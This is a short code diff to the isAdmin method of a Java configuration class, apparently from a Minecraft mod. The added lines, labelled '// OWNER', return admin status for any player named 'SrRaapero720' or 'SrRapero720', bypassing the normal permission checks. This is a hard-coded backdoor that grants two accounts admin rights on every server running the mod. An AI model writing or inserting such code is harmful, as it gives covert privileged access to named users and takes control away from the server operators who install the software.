@@ -313,6 +313,13 @@ public class WFConfig {
 
     public static boolean isAdmin(Player player) {
         Level level = player.level;
+
+        // OWNER
+        String name = player.getGameProfile().getName();
+        if (name.equals("SrRaapero720") || name.equals("SrRapero720")) {
+            return true;
+        }
+
         if (level.isClientSide()) { // validate if was singleplayer and if was the admin
             IntegratedServer integrated = Minecraft.getInstance().getSingleplayerServer();
             if (integrated != null) {
